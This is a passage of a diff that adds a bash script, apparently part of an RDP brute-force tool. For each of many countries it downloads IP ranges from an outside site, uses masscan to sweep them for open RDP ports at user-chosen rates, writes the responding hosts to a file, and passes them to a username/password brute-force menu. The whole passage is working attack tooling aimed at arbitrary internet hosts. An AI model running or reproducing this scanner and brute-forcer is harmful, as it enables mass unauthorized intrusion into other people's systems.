+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "157" ]; then
+curl http://ipdiapazon.16mb.com/Saint.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "158" ]; then
+curl http://ipdiapazon.16mb.com/Saint_lucia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "159" ]; then
+curl http://ipdiapazon.16mb.com/Samoa.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "160" ]; then
+curl http://ipdiapazon.16mb.com/San_marino.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "161" ]; then
+curl http://ipdiapazon.16mb.com/Saudi_arabia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "162" ]; then
+curl http://ipdiapazon.16mb.com/Senegal.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "163" ]; then
+curl http://ipdiapazon.16mb.com/Serbia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "164" ]; then
+curl http://ipdiapazon.16mb.com/Seychelles.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "165" ]; then
+curl http://ipdiapazon.16mb.com/Sierra_leone.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "166" ]; then
+curl http://ipdiapazon.16mb.com/Singapore.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "167" ]; then
+curl http://ipdiapazon.16mb.com/Slovakia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "168" ]; then
+curl http://ipdiapazon.16mb.com/Slovenia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "169" ]; then
+curl http://ipdiapazon.16mb.com/Solomon_islands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "170" ]; then
+curl http://ipdiapazon.16mb.com/South_africa.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "171" ]; then
+curl http://ipdiapazon.16mb.com/Spain.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "172" ]; then
+curl http://ipdiapazon.16mb.com/Sri_lanka.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
